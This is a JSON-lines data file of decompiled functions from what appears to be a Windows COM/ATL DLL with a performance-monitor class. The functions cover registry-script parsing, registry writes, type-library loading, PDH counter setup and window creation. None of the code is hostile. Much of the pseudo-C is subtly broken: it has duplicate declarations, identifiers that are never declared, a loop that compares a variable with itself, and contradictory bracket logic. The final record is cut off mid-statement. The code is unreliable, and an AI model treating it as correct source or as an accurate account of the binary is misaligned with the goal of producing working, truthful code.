{"Function Name": "FUN_1000dd24", "Address": "1000dd24", "Source Code": "void FUN_1000dd24(void)\n{\n    LPCSTR constantStringPointer; \n    uint basePointer;   \n    HMODULE moduleHandle; \n    int lengthOrCount;    \n    *(undefined4 *)(basePointer - 4) = 1; \n    \n    if (*(int *)(basePointer - 0x424) != 0) {\n        \n        int conversionResult = MultiByteToWideChar(3, 0, constantStringPointer, lengthOrCount, *(LPWSTR *)(basePointer - 0x424), lengthOrCount);\n        \n        \n        if (conversionResult == 0) {\n            FUN_1000d250(); \n        } else {\n            \n            *(undefined2 *)(*(int *)(basePointer - 0x424) + conversionResult * 2) = 0;\n            \n            FUN_1000ea20((void *)(basePointer - 0x1c), *(undefined (**) [16])(basePointer - 0x424), *(int *)(basePointer + 0x14));\n        }\n    }\n    \n    if (moduleHandle != (HMODULE)0x0) {\n        FreeLibrary(moduleHandle); \n    }\n    \n    if (*(int *)(basePointer - 0x424) != basePointer - 0x420) {\n        FUN_10011de0((void **)(basePointer - 0x424)); \n    }\n    \n    ___security_check_cookie_4(*(uint *)(basePointer - 0x14) ^ basePointer);\n    \n    return; \n}"}
{"Function Name": "FUN_1000de40", "Address": "1000de40", "Source Code": "void __fastcall FUN_1000de40(LPCWSTR *wideStringPointer) \n{\n    \n    while (**wideStringPointer == L'\\t' || **wideStringPointer == L'\\n' || **wideStringPointer == L'\\r' || **wideStringPointer == L' ') {\n        \n        *wideStringPointer = CharNextW(*wideStringPointer);\n    }\n}"}
{"Function Name": "FUN_1000de90", "Address": "1000de90", "Source Code": "undefined4 __thiscall FUN_1000de90(void *this, undefined2 *param_1)\n{\n    WCHAR currentChar; \n    code *nextCharFunc = CharNextW_exref; \n    WCHAR *nextCharPtr; \n    undefined2 *destBufferPtr = param_1; \n    LPCWSTR currentStringPtr = *this; \n    int charsProcessed, offsetToCopy; \n    FUN_1000de40((LPCWSTR *)this); \n    currentChar = *currentStringPtr; \n    if (currentChar != L'\\0') { \n        if (currentChar != L'\\'') { \n            do {\n                switch(currentChar) { \n                    case L'\\t': \n                    case L'\\n': \n                    case L'\\r': \n                    case L' ':  \n                        goto end_loop; \n                }\n                nextCharPtr = CharNextW(currentStringPtr); \n                *(WCHAR **)this = nextCharPtr; \n                charsProcessed = (int)nextCharPtr - (int)currentStringPtr >> 1; \n                if (param_1 + 0x1000 <= destBufferPtr + charsProcessed + 1) { \n                    return 0x80020009; \n                }\n                if (charsProcessed > 0) { \n                    offsetToCopy = (int)currentStringPtr - (int)destBufferPtr; \n                    do {\n                        *destBufferPtr = *(undefined2 *)(offsetToCopy + (int)destBufferPtr); \n                        destBufferPtr++; \n                        charsProcessed--; \n                    } while (charsProcessed != 0); \n                    currentStringPtr = *this; \n                }\n                currentChar = *currentStringPtr; \n            } while (currentChar != L'\\0'); \n        }\n    }\nend_loop:\n    *destBufferPtr = 0; \n    if (**this != 0) { \n        return (*nextCharFunc)(*this); \n    }\n    return 0x80020009; \n}"}
{"Function Name": "Catch_All@1000e1f0", "Address": "1000e1f0", "Source Code": "undefined * catchAllFunction(void)\n{\n    \n    return &dataPointer;\n}"}
{"Function Name": "Catch_All@1000e43c", "Address": "1000e43c", "Source Code": "undefined * catchAll(void)\n{\n    \n    return &dataPointer;\n}"}
{"Function Name": "FUN_1000e44e", "Address": "1000e44e", "Source Code": "void FUN_1000e44e(void)\n{\n    WCHAR wideChar; \n    LPWSTR wideStringPtr; \n    LPCWSTR constWideStringPtr; \n    uint errorCode; \n    int status; \n    DWORD dataSize; \n    undefined4 *outputBufferPtr; \n    outputBufferPtr = *(undefined4 **)(unaff_EBP - 0x2124); \n    if (outputBufferPtr == (undefined4 *)0x0) { \n        errorCode = 0xe; \n        status = 0; \n    } else {\n        constWideStringPtr = (LPCWSTR)(unaff_EBP - 0x2014); \n        wideChar = *(WCHAR *)(unaff_EBP - 0x2014); \n        while (wideChar != L'\\0') { \n            wideStringPtr = CharNextW(constWideStringPtr); \n            if ((*constWideStringPtr == L'\\\\') && (*wideStringPtr == L'0')) { \n                *(undefined2 *)outputBufferPtr = 0; \n                constWideStringPtr = CharNextW(wideStringPtr); \n            } else {\n                *(WCHAR *)outputBufferPtr = *constWideStringPtr; \n                constWideStringPtr++; \n            }\n            outputBufferPtr = (undefined4 *)((int)outputBufferPtr + 2); \n            wideChar = *constWideStringPtr; \n        }\n        *outputBufferPtr = 0; \n        short *shortDataPtr = *(short **)(unaff_EBP - 0x2124); \n        if (shortDataPtr == (short *)0x0) { \n            errorCode = 0xd; \n            status = 0; \n        } else {\n            dataSize = 0; \n            short *currentShortPtr = shortDataPtr; \n            do {\n                short *tempShortPtr = currentShortPtr; \n                while (*tempShortPtr != 0) { \n                    tempShortPtr++; \n                }\n                status = ((int)tempShortPtr - (int)(currentShortPtr + 1) >> 1) + 1; \n                currentShortPtr += status; \n                dataSize += status * 2; \n            } while (status != 1); \n            errorCode = RegSetValueExW(**(HKEY **)(unaff_EBP - 0x2130), *(LPCWSTR *)(unaff_EBP - 0x212c), 0, 7, (BYTE *)shortDataPtr, dataSize); \n            status = *(int *)(unaff_EBP - 0x2124); \n        }\n    }\n    if (status != unaff_EBP - 0x2120) { \n        FUN_10011de0((void **)(unaff_EBP - 0x2124)); \n    }\n    if (errorCode == 0) { \n        FUN_1000de90(*(void **)(unaff_EBP - 0x2128), *(undefined2 **)(unaff_EBP - 0x2138)); \n    } else {\n        FUN_1000d270(errorCode); \n    }\n    ___security_check_cookie_4(*(uint *)(unaff_EBP - 0x14) ^ unaff_EBP); \n    return; \n}"}
{"Function Name": "FUN_1000e6e0", "Address": "1000e6e0", "Source Code": "void __thiscall FUN_1000e6e0(void *this, undefined (*param_1)[16], undefined4 *param_2)\n{\n    undefined *tempPointer; \n    undefined2 *allocatedMemory; \n    wchar_t wideCharBuffer[32]; \n    uint securityCheckValue; \n    uint sizeCalculation; \n    undefined4 initialValue = 0xffffffff; \n    void *currentExceptionList = ExceptionList; \n    securityCheckValue = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &currentExceptionList; \n    \n    if (param_1 != (undefined (*)[16])0x0 && param_2 != (undefined4 *)0x0) {\n        *param_2 = 0; \n        undefined (*tempPointerArray)[16] = param_1; \n        do {\n            tempPointer = *tempPointerArray; \n            tempPointerArray = (undefined (*)[16])(*tempPointerArray + 2); \n        } while (*(short *)tempPointer != 0); \n        \n        allocatedMemory = (undefined2 *)0x0; \n        sizeCalculation = ((int)tempPointerArray - (int)(*param_1 + 2) >> 1) * 2; \n        if ((int)sizeCalculation < 100) { \n            sizeCalculation = 1000; \n        }\n        \n        \n        if ((int)((ulonglong)sizeCalculation * 2 >> 0x20) == 0) {\n            allocatedMemory = (undefined2 *)CoTaskMemAlloc((SIZE_T)((ulonglong)sizeCalculation * 2)); \n            if (allocatedMemory != (undefined2 *)0x0) { \n                *allocatedMemory = 0; \n            }\n        }\n        \n        \n        if (allocatedMemory == (undefined2 *)0x0) {\n            CoTaskMemFree(allocatedMemory); \n            return; \n        }\n        *(undefined (**) [16])this = param_1; \n        char cVar6 = DAT_100504e0; \n        int bracketCounter = 0; \n        bool firstConditionFlag = false; \n        bool secondConditionFlag = false; \n        short firstShortValue = *(short *)*param_1; \n        code *charProcessingFunction = CharNextW_exref; \n        \n        while (firstShortValue != 0) {\n            if (cVar6 == '\\x01') { \n                if (bracketCounter == 0 && (tempPointerArray = FUN_10017fb5(param_1, (undefined (*)[16])L\"HKCR\"), tempPointerArray != (undefined (*)[16])0x0) && tempPointerArray == *this) {\n                    undefined4 functionResult = (*charProcessingFunction)(*this, securityCheckValue); \n                    *(undefined4 *)this = functionResult; \n                    for (int loopIndex = 0; loopIndex < 4; loopIndex++) { \n                        functionResult = (*charProcessingFunction)(functionResult); \n                        *(undefined4 *)this = functionResult; \n                    }\n                    \n                    if (FUN_1000d9a0(&local_60, (undefined8 *)L\"HKCU\\r\\n{\\tSoftware\\r\\n\\t{\\r\\n\\t\\tClasses\") == 0) {\n                        CoTaskMemFree(allocatedMemory); \n                        return; \n                    }\n                    firstConditionFlag = true; \n                }\n                \n                if (**this == 0x27) {\n                    if (secondConditionFlag) { \n                        short *nextCharacter = (short *)(*charProcessingFunction)(*this, securityCheckValue); \n                        if (*nextCharacter != 0x27) { \n                            secondConditionFlag = false; \n                        } else {\n                            undefined8 *currentPointer = (undefined8 *)(*charProcessingFunction)(*this, securityCheckValue); \n                            *(undefined8 **)this = currentPointer; \n                            \n                            if (FUN_1000d8f0(&local_60, currentPointer, 1) == 0) {\n                                CoTaskMemFree(allocatedMemory); \n                                return; \n                            }\n                        }\n                    } else {\n                        secondConditionFlag = true; \n                    }\n                } else {\n                    \n                    if (!secondConditionFlag) {\n                        if (**this != 0x7b) { \n                            bracketCounter++; \n                        }\n                        if (**this == 0x7d && --bracketCounter == 0 && firstConditionFlag) { \n                            \n                            if (FUN_1000d9a0(&local_60, (undefined8 *)L\"\\r\\n\\t}\\r\\n}\\r\\n\") == 0) {\n                                CoTaskMemFree(allocatedMemory); \n                                return; \n                            }\n                            firstConditionFlag = false; \n                        }\n                    }\n                }\n            }\n            firstShortValue = *(short *)*param_1; \n        }\n        undefined8 *currentPointer = *this; \n        \n        if (*(short *)currentPointer == 0x25) {\n            currentPointer = (undefined8 *)(*charProcessingFunction)(currentPointer, securityCheckValue); \n            *(undefined8 **)this = currentPointer; \n            \n            if (*(WCHAR *)currentPointer != L'%') {\n                LPCWSTR nextPercentageSign = FUN_1000ddf0((LPWSTR)currentPointer, L'%'); \n                if (nextPercentageSign == (LPCWSTR)0x0) { \n                    CoTaskMemFree(allocatedMemory); \n                    return; \n                }\n                sizeCalculation = (int)nextPercentageSign - (int)*this >> 1; \n                if (0x1f < (int)sizeCalculation) { \n                    CoTaskMemFree(allocatedMemory); \n                    return; \n                }\n                undefined4 functionResult = FUN_10025329(wideCharBuffer, 0x20, *this, sizeCalculation); \n                FUN_1000d1b0(functionResult); \n                int valueFromThis = *(int *)((int)this + 4); \n                int searchIndex = 0; \n                \n                while (lstrcmpiW(*(LPCWSTR *)(*(int *)(valueFromThis + 4) + searchIndex * 4), wideCharBuffer) != 0) {\n                    searchIndex++; \n                    if (*(int *)(valueFromThis + 0xc) <= searchIndex) { \n                        CoTaskMemFree(allocatedMemory); \n                        return; \n                    }\n                }\n                \n                if (searchIndex < 0 || *(int *)(valueFromThis + 0xc) <= searchIndex) {\n                    FUN_10007bf0(0xc000008c, 1); \n                    return; \n                }\n                currentPointer = *(undefined8 **)(*(int *)(valueFromThis + 8) + searchIndex * 4); \n                if (currentPointer == (undefined8 *)0x0) { \n                    CoTaskMemFree(allocatedMemory); \n                    return; \n                }\n                \n                if (FUN_1000d9a0(&local_60, currentPointer) == 0) {\n                    CoTaskMemFree(allocatedMemory); \n                    return; \n                }\n                LPCWSTR currentValue = *this; \n                \n                while (currentValue != nextPercentageSign) {\n                    currentValue = CharNextW(*this); \n                    *(LPCWSTR *)this = currentValue; \n                }\n            } else {\n                \n                if (FUN_1000d8f0(&local_60, currentPointer, 1) == 0) {\n                    CoTaskMemFree(allocatedMemory); \n                    return; \n                }\n            }\n        }\n        param_1 = (undefined (*)[16])(*charProcessingFunction)(*this); \n        *(undefined (**) [16])this = param_1; \n        firstShortValue = *(short *)*param_1; \n        allocatedMemory = (undefined2 *)0x0; \n        *param_2 = allocatedMemory; \n        CoTaskMemFree((LPVOID)0x0); \n    }\n    ExceptionList = currentExceptionList; \n    ___security_check_cookie_4(local_14 ^ (uint)&stack0xfffffffc); \n}"}
{"Function Name": "FUN_1000f850", "Address": "1000f850", "Source Code": "void FUN_1000f850(int *param_1)\n{\n    int returnValue; \n    uint *dynamicArrayPointer; \n    BSTR currentBSTR; \n    BSTR tempBSTR; \n    uint localValue; \n    BSTR *bstrArrayPointer; \n    int loopCounter; \n    BSTR *bstrPointer; \n    BSTR localBSTR; \n    uint securityCookie; \n    void *exceptionListPointer; \n    undefined4 securityCheckVariable; \n    \n    securityCheckVariable = 0xffffffff; \n    exceptionListPointer = ExceptionList; \n    securityCookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &exceptionListPointer; \n    \n    returnValue = (**(code **)(*param_1 + 0xc))(param_1, &local_20, securityCookie); \n    if (-1 < returnValue) { \n        bstrArrayPointer = (BSTR *)0x0; \n        localValue = (uint)*(ushort *)(local_20 + 0x2c); \n        DAT_1004ea64 = (BSTR *)0x0; \n        DAT_1004ea68 = localValue; \n        \n        if (localValue != 0) { \n            dynamicArrayPointer = (uint *)FUN_100141c0(-(uint)(0xfffffffb < localValue * 0xc) | localValue * 0xc + 4); \n            if (dynamicArrayPointer != (uint *)0x0) { \n                *dynamicArrayPointer = localValue; \n                bstrArrayPointer = (BSTR *)(dynamicArrayPointer + 1); \n                _eh_vector_constructor_iterator_(bstrArrayPointer, 0xc, localValue, (_func_void_void_ptr *)&LAB_1000f830, FUN_10007d30); \n            }\n            if (bstrArrayPointer == (BSTR *)0x0) { \n                (**(code **)(*param_1 + 0x4c))(param_1, local_20); \n                goto LAB_1000f9ef; \n            }\n        }\n        \n        loopCounter = 0; \n        if (0 < (int)DAT_1004ea68) { \n            do {\n                returnValue = (**(code **)(*param_1 + 0x14))(param_1, loopCounter, &bstrPointer); \n                if (-1 < returnValue) { \n                    localBSTR = (BSTR)0x0; \n                    returnValue = (**(code **)(*param_1 + 0x30))(param_1, *bstrPointer, &localBSTR, 0, 0, 0); \n                    tempBSTR = localBSTR; \n                    if (-1 < returnValue) { \n                        currentBSTR = *bstrArrayPointer; \n                        if (currentBSTR != tempBSTR) { \n                            SysFreeString(currentBSTR); \n                            *bstrArrayPointer = tempBSTR; \n                        }\n                        bstrArrayPointer[1] = (BSTR)SysStringLen(tempBSTR); \n                        bstrArrayPointer[2] = *bstrPointer; \n                    }\n                    (**(code **)(*param_1 + 0x50))(param_1, bstrPointer); \n                    SysFreeString(localBSTR); \n                }\n                loopCounter++; \n                bstrArrayPointer += 3; \n            } while (loopCounter < (int)DAT_1004ea68); \n        }\n        DAT_1004ea64 = bstrArrayPointer; \n        (**(code **)(*param_1 + 0x4c))(param_1, local_20); \n    }\nLAB_1000f9ef:\n    ExceptionList = exceptionListPointer; \n    ___security_check_cookie_4(securityCookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_1000faa0", "Address": "1000faa0", "Source Code": "void FUN_1000faa0(LCID locale_id)\n{\n    DWORD module_file_name_result; \n    HRESULT type_lib_result; \n    int function_return_value; \n    LPCRITICAL_SECTION critical_section_ptr; \n    LPCRITICAL_SECTION critical_section_local; \n    int *integer_data_ptr_1; \n    int *integer_data_ptr_2; \n    int *integer_data_ptr_3; \n    int *integer_data_ptr_4; \n    WCHAR module_file_name_buffer[260]; \n    uint security_cookie; \n    void *previous_exception_list; \n    undefined4 status_flags; \n    status_flags = -1; \n    previous_exception_list = ExceptionList; \n    security_cookie = DAT_1004e008 ^ (uint)&stack0xfffffffc; \n    ExceptionList = &previous_exception_list; \n    \n    if ((CONCAT22(DAT_1004ea5c._2_2_, (undefined2)DAT_1004ea5c) != 0) && (DAT_1004ea64 != 0))\n        goto LAB_1000fe45; \n    critical_section_ptr = (LPCRITICAL_SECTION)(DAT_100504dc + 0x10); \n    status_flags = 0; \n    EnterCriticalSection(critical_section_ptr); \n    \n    if (CONCAT22(DAT_1004ea5c._2_2_, (undefined2)DAT_1004ea5c) == 0) {\n        critical_section_local = (LPCRITICAL_SECTION)0x0; \n        \n        if (((((DAT_10050500 == *(int *)PTR_DAT_1004ea54) &&\n            (DAT_10050504 == *(int *)(PTR_DAT_1004ea54 + 4))) &&\n            (DAT_10050508 == *(int *)(PTR_DAT_1004ea54 + 8))) &&\n            ((DAT_1005050c == *(int *)(PTR_DAT_1004ea54 + 0xc) && ((WORD)DAT_1004ea58 == 0xffff)))) &&\n            (DAT_1004ea58._2_2_ == 0xffff)) {\n            module_file_name_result = GetModuleFileNameW(DAT_1004fccc, module_file_name_buffer, 0x104); \n            if ((module_file_name_result == 0) || (module_file_name_result == 0x104)) goto LAB_1000fe22; \n            type_lib_result = LoadTypeLib(module_file_name_buffer, (ITypeLib **)&critical_section_local); \n        } else {\n            type_lib_result = LoadRegTypeLib((GUID *)PTR_DAT_1004ea54, (WORD)DAT_1004ea58, DAT_1004ea58._2_2_, locale_id, (ITypeLib **)&critical_section_local); \n        }\n        \n        if (-1 < type_lib_result) {\n            integer_data_ptr_3 = (int *)0x0; \n            status_flags._0_1_ = 1; \n            function_return_value = (*(code *)critical_section_local->DebugInfo->Flags)(critical_section_local, PTR_DAT_1004ea50, &integer_data_ptr_3, security_cookie); \n            if (-1 < function_return_value) {\n                status_flags._0_1_ = 2; \n                integer_data_ptr_1 = integer_data_ptr_3; \n                \n                if (integer_data_ptr_3 != (int *)0x0) {\n                    (**(code **)(*integer_data_ptr_3 + 4))(integer_data_ptr_3); \n                }\n                integer_data_ptr_2 = (int *)0x0; \n                status_flags._0_1_ = 4; \n                function_return_value = (**(code **)*integer_data_ptr_3)(integer_data_ptr_3, &DAT_10048038, &integer_data_ptr_2); \n                if (-1 < function_return_value) {\n                    status_flags._0_1_ = 6; \n                    \n                    if (integer_data_ptr_1 == (int *)0x0) {\n                        if (integer_data_ptr_2 == (int *)0x0) {\n                            goto LAB_1000fd0d; \n                        }\n                    } else {\n                        if (integer_data_ptr_2 == (int *)0x0) goto LAB_1000fd0d; \n                        integer_data_ptr_4 = (int *)0x0; \n                        (**(code **)*integer_data_ptr_1)(integer_data_ptr_1, &DAT_10047bdc, &integer_data_ptr_4); \n                        (**(code **)*integer_data_ptr_2)(integer_data_ptr_2, &DAT_10047bdc, &local_22c); \n                        if (integer_data_ptr_4 == local_22c) {\n                            goto LAB_1000fd0d; \n                        }\n                    }\n                    status_flags._0_1_ = 5; \n                    \n                    if ((integer_data_ptr_2 == (int *)0x0) || (function_return_value = (**(code **)*integer_data_ptr_2)(integer_data_ptr_2, &DAT_10048028, &integer_data_ptr_1), function_return_value < 0)) {\n                        integer_data_ptr_1 = (int *)0x0; \n                    }\n                    \n                    if (integer_data_ptr_1 != (int *)0x0) {\n                        (**(code **)(*integer_data_ptr_1 + 8))(integer_data_ptr_1); \n                    }\n                }\n            }\n            \n            DAT_1004ea5c._0_2_ = SUB42(integer_data_ptr_1, 0);\n            DAT_1004ea5c._2_2_ = (undefined2)((uint)integer_data_ptr_1 >> 0x10);\n            integer_data_ptr_1 = (int *)0x0; \n            uint calculated_value = -(uint)(DAT_100504dc != 0) & DAT_100504dc + 4U; \n            \n            if (calculated_value != 0) {\n                code **function_pointer_array = (code **)FUN_100143c4(0xc); \n                if (function_pointer_array != (code **)0x0) {\n                    *function_pointer_array = FUN_1000fa10; \n                    function_pointer_array[1] = (code *)&PTR_DAT_1004ea50; \n                    EnterCriticalSection((LPCRITICAL_SECTION)(calculated_value + 0xc)); \n                    function_pointer_array[2] = *(code **)(calculated_value + 8); \n                    *(code ***)(calculated_value + 8) = function_pointer_array; \n                    LeaveCriticalSection((LPCRITICAL_SECTION)(calculated_value + 0xc)); \n                }\n            }\n            \n            if (integer_data_ptr_2 != (int *)0x0) {\n                (**(code **)(*integer_data_ptr_2 + 8))(integer_data_ptr_2, critical_section_local); \n            }\n            \n            if (integer_data_ptr_1 != (int *)0x0) {\n                (**(code **)(*integer_data_ptr_1 + 8))(integer_data_ptr_1); \n            }\n        }\n    }\nLAB_1000fe22:\n    \n    if (((int *)CONCAT22(DAT_1004ea5c._2_2_, (undefined2)DAT_1004ea5c) != (int *)0x0) && (DAT_1004ea64 == 0)) {\n        FUN_1000f850((int *)CONCAT22(DAT_1004ea5c._2_2_, (undefined2)DAT_1004ea5c)); \n    }\n    LeaveCriticalSection(critical_section_ptr); \nLAB_1000fe45:\n    ExceptionList = previous_exception_list; \n    ___security_check_cookie_4(security_cookie ^ (uint)&stack0xfffffffc); \n    return; \n}"}
{"Function Name": "FUN_1000fe70", "Address": "1000fe70", "Source Code": "void __fastcall FUN_1000fe70(undefined4 *functionParams) \n{\n    *functionParams = CPerfMon::vftable; \n    FUN_100133c0((int)functionParams); \n    if ((void **)functionParams[2] != (void **)0x0) { \n        FUN_100129f0((void **)functionParams[2], (void **)functionParams[3]); \n        void *thirdElement = (void *)functionParams[2]; \n        \n        if ((0xfff < (uint)(((functionParams[4] - (int)thirdElement) / 0x1c) * 0x1c)) &&\n            (thirdElement = *(void **)((int)thirdElement + -4), 0x1f < (uint)((int)thirdElement + (-4 - (int)*(void **)((int)thirdElement + -4)))))) {\n            FUN_1001dea6(); \n            code *functionPointer = (code *)swi(3); \n            (*functionPointer)(); \n            return; \n        }\n        FUN_10013ceb(thirdElement); \n        functionParams[2] = 0; \n        functionParams[3] = 0; \n        functionParams[4] = 0; \n    }\n    return; \n}"}
{"Function Name": "FUN_10010090", "Address": "10010090", "Source Code": "void __thiscall FUN_10010090(void *object, undefined4 input_param)\n{\n    \n    \n    FUN_1000f390(object, 0x66, input_param, NULL);\n}"}
{"Function Name": "FUN_10010200", "Address": "10010200", "Source Code": "void __fastcall FUN_10010200(int input_param)\n{\n    \n    int **int_pointer = (int **)(input_param + 0x14);\n    \n    \n    if (*int_pointer != (int *)0x0) {\n        \n        free_data_function(*int_pointer);\n    }\n}"}
{"Function Name": "FUN_10010320", "Address": "10010320", "Source Code": "void FUN_10010320(void)\n{\n    code *functionPointer; \n    int functionResult; \n    undefined4 ****pointerToPointer; \n    undefined4 undefinedDataArray[4]; \n    uint securityCheckValue = DAT_1004e008 ^ (uint)undefinedDataArray; \n    functionResult = FUN_1000acf0(undefinedDataArray); \n    if (-1 < functionResult) { \n        pointerToPointer = (local_10 > 7) ? undefinedDataArray[0] : undefinedDataArray; \n        ShellExecuteW((HWND)0x0, L\"edit\", (LPCWSTR)pointerToPointer, (LPCWSTR)0x0, (LPCWSTR)0x0, 1); \n    }\n    if (local_10 > 7) { \n        pointerToPointer = undefinedDataArray[0]; \n        if (0xfff < local_10 * 2 + 2) { \n            pointerToPointer = (undefined4 ****)undefinedDataArray[0][-1]; \n            if (0x1f < (uint)((int)undefinedDataArray[0] + (-4 - (int)pointerToPointer))) { \n                FUN_1001dea6(); \n                functionPointer = (code *)swi(3); \n                (*functionPointer)(); \n                return; \n            }\n        }\n        FUN_10013ceb(pointerToPointer); \n    }\n    ___security_check_cookie_4(securityCheckValue); \n    return; \n}"}
{"Function Name": "FUN_100103e0", "Address": "100103e0", "Source Code": "void FUN_100103e0(int input_param) \n{\n    undefined4 *object_ref; \n    undefined4 *storage_ptr; \n    code *function_ptr; \n    void **data_end_ptr; \n    void *generic_data_ptr; \n    int *int_ptr; \n    int int_storage; \n    void **data_start_ptr; \n    wchar_t wide_string_buffer[2050]; \n    uint checksum; \n    uint stack_var; \n    void **data_start_ptr = (void **)0x0; \n    void **data_end_ptr = (void **)0x0; \n    void **local_ptr_3 = (void **)0x0; \n    checksum = DAT_1004e008 ^ (uint)&local_ptr_3; \n    FUN_100133c0(input_param + 0x3c); \n    FUN_1000af40((int *)(input_param + 0x58)); \n    int_ptr = (int *)**(int **)(input_param + 0x5c); \n    if (int_ptr != *(int **)(input_param + 0x5c)) { \n        do {\n            FUN_1000c630(&local_var_1, (undefined8 *)(int_ptr + 2)); \n            FUN_1000c630(&local_var_2, (undefined8 *)(int_ptr + 0xe)); \n            if (local_ptr_3 == data_end_ptr) { \n                FUN_10012830(&data_start_ptr, data_end_ptr, &local_var_1); \n                if (7 < stack_var) { \n                    generic_data_ptr = local_var_1; \n                    if ((0xfff < stack_var * 2 + 2) && (generic_data_ptr = *(void **)((int)local_var_1 + -4), 0x1f < (uint)((int)local_var_1 + (-4 - (int)generic_data_ptr)))) goto LAB_1001072c; \n                    FUN_10013ceb(generic_data_ptr); \n                }\n            } else {\n                data_end_ptr[4] = (void *)0x0; \n                *data_end_ptr = local_var_1; \n                data_end_ptr[6] = local_var_2; \n                *(ulonglong *)(data_end_ptr + 4) = CONCAT44(stack_var, local_var_3); \n                data_end_ptr = data_end_ptr + 0xc; \n            }\n            int_ptr = (int *)*int_ptr; \n        } while (int_ptr != (int *)*(int *)(input_param + 0x5c)); \n    }\n    \n    int_storage = *(int *)(input_param + 0x44); \n    object_ref = (undefined4 *)(input_param + 0x44); \n    \n    if (int_storage != *(int *)(input_param + 0x48)) { \n        do {\n            PdhRemoveCounter(*(undefined4 *)(int_storage + 0x18)); \n            int_storage = int_storage + 0x1c; \n        } while (int_storage != *(int *)(input_param + 0x48)); \n    }\n    \n    storage_ptr = (undefined4 *)(input_param + 0x40); \n    if (*(int *)(input_param + 0x40) != 0) { \n        PdhCloseQuery(*(int *)(input_param + 0x40)); \n    }\n    *storage_ptr = 0; \n    FUN_100129f0((void **)*object_ref, *(void ***)(input_param + 0x48)); \n    *(undefined4 *)(input_param + 0x48) = *object_ref; \n    int_storage = PdhOpenQueryW(0, 0, storage_ptr); \n    if ((int_storage == 0) && (_memset(wide_string_buffer, 0, 0x1000), data_start_ptr != data_end_ptr)) { \n        data_start_ptr = data_start_ptr + 6; \n        do {\n            data_end_ptr = data_start_ptr; \n            if ((void *)0x7 < data_start_ptr[5]) { \n                data_end_ptr = (void **)*data_start_ptr; \n            }\n            _wcscpy_s(wide_string_buffer, 0x800, (wchar_t *)data_end_ptr); \n            generic_data_ptr = (void *)PdhValidatePathW(wide_string_buffer); \n            if ((generic_data_ptr == (void *)0x0) && (int_storage = PdhAddCounterW(*local_1054, wide_string_buffer, 0, &generic_data_ptr), int_storage == 0)) { \n                FUN_1000c630(&local_var_1, (undefined8 *)(data_start_ptr + -6)); \n                if (*(void ***)(input_param + 0x4c) == *(void ***)(input_param + 0x48)) { \n                    FUN_100134d0(object_ref, *(void ***)(input_param + 0x48), &local_var_1); \n                    if (7 < stack_var) { \n                        generic_data_ptr = local_var_1; \n                        if ((0xfff < stack_var * 2 + 2) && (generic_data_ptr = *(void **)((int)local_var_1 + -4), 0x1f < (uint)((int)local_var_1 + (-4 - (int)generic_data_ptr)))) goto LAB_1001072c; \n                        FUN_10013ceb(generic_data_ptr); \n                    }\n                } else {\n                    *(void **)(*(void ***)(input_param + 0x48)) = local_var_1; \n                    *(ulonglong *)(*(void ***)(input_param + 0x48) + 4) = CONCAT44(stack_var, local_var_3); \n                    *(int *)(input_param + 0x48) = *(int *)(input_param + 0x48) + 0x1c; \n                }\n            }\n            data_end_ptr = data_start_ptr + 6; \n            data_start_ptr = data_start_ptr + 0xc; \n        } while (data_end_ptr != data_end_ptr); \n    }\n    \n    data_end_ptr = data_end_ptr; \n    data_start_ptr = data_start_ptr; \n    \n    if (data_start_ptr != (void **)0x0) { \n        for (; data_start_ptr != data_end_ptr; data_start_ptr = data_start_ptr + 0xc) { \n            FUN_10008930(data_start_ptr); \n        }\n        data_start_ptr = data_start_ptr; \n        if ((0xfff < (uint)((((int)local_ptr_3 - (int)data_start_ptr) / 0x30) * 0x30)) && (data_start_ptr = (void **)data_start_ptr[-1], 0x1f < (uint)((int)data_start_ptr + (-4 - (int)data_start_ptr)))) { \n            LAB_1001072c: \n            FUN_1001dea6(); \n            function_ptr = (code *)swi(3); \n            (*function_ptr)(); \n            return; \n        }\n        FUN_10013ceb(data_start_ptr); \n    }\n    ___security_check_cookie_4(checksum ^ (uint)&local_ptr_3); \n    return; \n}"}
{"Function Name": "FUN_10010880", "Address": "10010880", "Source Code": "undefined4 FUN_10010880(undefined4 input_value, undefined4 *output_pointer)\n{\n    \n    *output_pointer = 1;\n    \n    \n    return 0;\n}"}
{"Function Name": "FUN_100108e0", "Address": "100108e0", "Source Code": "void FUN_100108e0(int windowParam, int *functionPointer)\n{\n    HWND parentWindowHandle; \n    tagRECT windowDimensions; \n    int *dataPointer = (int *)0x0; \n    uint securityCheckValue = DAT_1004e008 ^ (uint)&stack0xfffffff0; \n    void *originalExceptionList = ExceptionList; \n    ExceptionList = &originalExceptionList; \n    if (functionPointer == (int *)0x0) goto LAB_10010a29; \n    \n    if ((**(code **)*functionPointer)(functionPointer, &DAT_1004838c, &dataPointer, securityCheckValue) < 0) {\n        dataPointer = (int *)0x0; \n    }\n    \n    if ((dataPointer == (int *)0x0) || ((**(code **)(*dataPointer + 0xc))(dataPointer, &parentWindowHandle) < 0)) {\n        goto LAB_10010a29; \n    }\n    GetClientRect(parentWindowHandle, &windowDimensions); \n    HMENU menuHandle = (HMENU)(windowParam + 0x10); \n    ushort windowClassAtom = FUN_10012580(0x1004fcc8, (WNDCLASSEXW *)&DAT_1004e9c0, (UINT *)(windowParam + 0x30)); \n    uint *dataPointerFromParam = *(uint **)(windowParam + 0x24); \n    \n    if (dataPointerFromParam == (uint *)0x0) {\n        dataPointerFromParam = _AtlThunk_AllocateData_0(); \n        *(uint **)(windowParam + 0x24) = dataPointerFromParam; \n        if (dataPointerFromParam == (uint *)0x0) {\n            SetLastError(0xe); \n        }\n    }\n    _AtlThunk_InitData_12((int *)dataPointerFromParam, 0, (void *)0x0); \n    if (windowClassAtom != 0) { \n        HMENU *menuPointer = (HMENU *)(windowParam + 0x18); \n        \n        if ((menuPointer == (HMENU *)0x0) || (menuHandle == (HMENU)0x0)) {\n            FUN_10007bf0(0xc0000005, 1); \n            return; \n        }\n        *menuPointer = menuHandle; \n        *(DWORD *)(windowParam + 0x1c) = GetCurrentThreadId(); \n        EnterCriticalSection((LPCRITICAL_SECTION)&DAT_1004eaa4); \n        *(HMENU **)(windowParam + 0x20) = DAT_1004eabc; \n        DAT_1004eabc = menuPointer; \n        LeaveCriticalSection((LPCRITICAL_SECTION)&DAT_1004eaa4); \n        \n        CreateWindowExW(0, (LPCWSTR)(uint)windowClassAtom, (LPCWSTR)0x0, 0x40000000, windowDimensions.left, windowDimensions.top,\n                         